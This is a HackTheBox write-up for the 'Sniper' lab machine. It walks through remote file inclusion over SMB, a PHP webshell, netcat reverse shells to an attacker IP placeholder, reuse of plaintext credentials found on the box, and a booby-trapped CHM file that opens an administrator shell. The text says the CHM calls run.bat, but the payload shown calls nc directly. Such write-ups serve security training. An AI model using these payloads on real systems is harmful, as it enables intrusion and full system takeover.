---
title: "HTB: Sniper"
categories:
  - HackTheBox
tags:
  - HackTheBox
---

![Sniper](https://www.hackthebox.eu/storage/avatars/6f9b9e9836e3374e14b57096f35caf57.png)

# Sniper

## Initial Foothold

http://sniper.htb/blog/?lang=\\xx.xx.xx.xx\share\test.php is vulnerable to RFI over SMB.

We can set up a SMB server to exploit the RFI here:

Add to the bottom of /etc/samba/smb.conf:

```
[share]
path = /home/xxxx/share
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
```

Then, chmod the directory:

```
chmod 0555 /home/xxxx/share
```

We can use the webshell found at the following github:

https://github.com/WhiteWinterWolf/wwwolf-php-webshell

Now, by visiting http://sniper.htb/blog/?lang=\xx.xx.xx.xx\share\webshell.php we are able to upload file and execute commands!

The first thing we need to do is create a new folder _C:\TEMP_ and upload nc.exe to it.

From here, we are able to run the command:

```
C:\TEMP\nc.exe -nv xx.xx.xx.xx 4444 -e cmd.exe
```

Voila, we have a shell!

## Pivoting to User

While enumerating, we stumble upon some credentials held in C:\inetpub\wwwroot\user\db.php:

**chris:36mEAhz/B8xQ~2VM**

We can use a switch-shell with Powershell to get a semi-interactive shell:

```
function switch-psuser {

    Param(
        [Parameter(Position=0)]
        [ValidateSet("adminsystem","administrator")]
        $User = "adminsystem"
    )

    switch($User)
    {
        'adminsystem'   { $username = "domain\adminsystem" ; $pw = "yyy"}
        'administrator' { $username = "sniper\chris" ; $pw = "36mEAhz/B8xQ~2VM" }
    }

    $password = $pw | ConvertTo-SecureString -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
    New-PSSession -Credential $cred | Enter-PSSession
}
switch-psuser administrator
```

We can now run nc.exe since this shell can execute commands. However, we need to first grant this user permissions to access it using our webshell:
```
cacls C:\TEMP /e /p chris:f
cacls C:\TEMP\nc.exe /e /p chris:f
```
Now, we can run nc.exe and receive a shell:
```
C:\TEMP\nc.exe -nv xx.xx.xx.xx 4444 -e cmd.exe
```

Voila, we have user!

## Getting Root

We've got a note in C:/Docs that's semi helpful:

```
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
```
Based on the note, it looks like whatever we drop in C:/Docs might be looked at by the administrator.

Also, in C:\Users\chris\Downloads, there's a file called instructions.chm.

A publically available exploit for chm files is available:

https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7

## Exploiting the CHM for Profit

We first need to unpack the chm file:

```
copy C:\Users\chris\Downloads\instructions.chm C:\TEMP
cd C:\TEMP
hh -decompile extract instructions.chm
cd extract
nc -nv xx.xx.xx.xx 4444 < a.html
```

Now, once we catch this on our machine, we can see what's in the HTML file:

```
<html>
<body>
<h1>Sniper Android App Documentation</h1>
<h2>Table of Contents</h2>

<p>Pff... This dumb CEO always makes me do all the shitty work. SMH!</p>
<p>I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him.</p>
</body>
</html>
```

We can modify the PoC and place it in the body of our file. The end results is:

```
<html>
<body>
<h1>Sniper Android App Documentation</h1>
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=",nc,-nv xx.xx.xx.xx 4444">
 <PARAM name="Item2" value="273,1,1">
</OBJECT>

<SCRIPT>
x.Click();
</SCRIPT>
<h2>Table of Contents</h2>

<p>Pff... This dumb CEO always makes me do all the shitty work. SMH!</p>
<p>I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him.</p>
</body>
</html>
```

Now, because we've asked it to call run.bat in our TEMP folder, we need to create a batch script for it to run:

```
echo C:\TEMP\nc.exe -nv xx.xx.xx.xx 4444 -e cmd.exe > C:\TEMP\run.bat
```

From here, we need to create a Project.hpp file to point hh.exe at when we recompile the chm file:

```
[FILES]
<PATH TO FILES>\a.html
```

Now, we copy the Project.hpp file and a.html to a windows machine and run:

```
hhc.exe <PATH TO FILES>\Project.hpp
```

We're given a Project.chm file in the same folder that held Project.hpp. We can copy this over to the victim machine, place it in C:\Docs and wait for it to return a shell to us!

```
C:\>whoami
whoami
sniper\administrator
```

